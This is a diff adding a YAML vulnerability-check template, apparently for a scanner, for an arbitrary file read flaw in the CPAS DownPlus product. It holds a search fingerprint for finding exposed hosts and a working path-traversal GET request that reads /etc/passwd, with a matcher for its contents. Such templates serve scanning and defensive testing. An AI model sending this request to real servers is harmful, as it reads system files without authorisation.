@@ -1,0 +1,22 @@
+id: youshuju-cpas-downplus-fileread
+
+info:
+  name: 优数据CPAS DownPlus文件读取漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    优数据CPAS DownPlus文件读取漏洞，可以读取任意文件内容。
+    fofa: body="/cpasm4/static/cap/font/iconfont.css"
+  reference:
+    - https://mp.weixin.qq.com/s/U5fhtRCaoUxj-tay-d_oMw
+  tags: youshuju,fileread,lfi
+  created: 2024/12/31
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName=1.txt
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
